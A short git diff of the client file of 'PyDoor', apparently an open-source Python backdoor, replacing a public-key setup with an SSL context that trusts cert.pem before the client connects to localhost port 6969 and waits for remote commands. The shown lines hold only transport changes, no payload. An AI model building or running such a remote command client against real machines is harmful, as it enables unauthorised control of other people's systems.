@@ -1,5 +1,6 @@
 """ PyDoor Client """
 import os
+import ssl
 import json
 import logging
 import subprocess
@@ -21,8 +22,8 @@ class CommandClient(Client):
     # List of tasks that have output, but timed out
     task_list: list[tasks.Task] = []
 
-    def __init__(self, public_key: ec.EllipticCurvePublicKey) -> None:
-        Client.__init__(self, public_key)
+    def __init__(self, ssl_context: ssl.SSLContext) -> None:
+        Client.__init__(self, ssl_context)
 
     def listen(self) -> None:
         """ Listen for coming commands """
@@ -290,14 +291,11 @@ class CommandClient(Client):
 
 if __name__ == '__main__':
 
-    from cryptography.hazmat.primitives import serialization
-
-    # Read certificate from file
-    with open('public.pem', 'rb') as cert_file:
-        pubkey = serialization.load_pem_public_key(cert_file.read())
+    # Create SSLContext
+    context = ssl.create_default_context(cafile="cert.pem")
 
     # Connect to server
-    client = CommandClient(pubkey)
+    client = CommandClient(context)
     client.connect(('localhost', 6969))
 
     # Listen to commands indefinitely
